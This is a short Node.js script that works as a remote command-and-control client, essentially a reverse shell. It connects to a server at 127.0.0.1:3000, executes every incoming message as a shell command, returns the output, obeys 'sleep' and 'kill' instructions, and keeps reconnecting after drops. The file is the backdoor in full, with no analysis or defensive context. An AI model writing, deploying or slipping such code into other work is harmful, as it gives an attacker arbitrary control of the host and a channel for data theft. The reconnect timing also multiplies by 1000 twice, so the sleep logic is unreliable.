const net = require('net');
const { exec } = require('child_process');

const serverHost = '127.0.0.1';
const serverPort = 3000;

let reconnectTimer = null;
let socket = null;

function connect() {
  socket = new net.Socket();

  socket.on('connect', () => {
    console.log('Connected to server');
    clearTimeout(reconnectTimer); // Clear the reconnect timer if connected successfully
  });

  socket.on('data', (data) => {
    const [command, ...args] = data.toString().trim().split(' ');

    switch (command) {
      case 'sleep':
        handleSleepCommand(args[0]);
        break;
      case 'kill':
        handleKillCommand();
        break;
      default:
        executeCommand(data.toString().trim());
        break;
    }
  });

  socket.on('close', () => {
    console.log('Connection closed by the server');
    scheduleReconnect();
  });

  socket.on('error', (error) => {
    console.error(`An error occurred: ${error.message}`);
    scheduleReconnect();
  });

  socket.connect(serverPort, serverHost);
}

function executeCommand(command) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      socket.write(`Error: ${error.message}`); // Send error message to the server
      return;
    }
    socket.write(`Output: ${stdout}`); // Send command output to the server
  });
}


function handleSleepCommand(duration) {
  const sleepDuration = parseInt(duration, 10);
  console.log(`Sleeping for ${sleepDuration} seconds...`);
  socket.end(); // Close the connection

  scheduleReconnect(sleepDuration * 1000); // Convert to milliseconds
}


function handleKillCommand() {
  console.log('Kill command received. Closing the connection.');
  socket.end(); // Close the connection
}

function scheduleReconnect(sleepDuration) {
  console.log(`Reconnecting after sleep duration: ${sleepDuration} seconds`);
  clearTimeout(reconnectTimer);
  reconnectTimer = setTimeout(connect, sleepDuration * 1000);
}

connect();
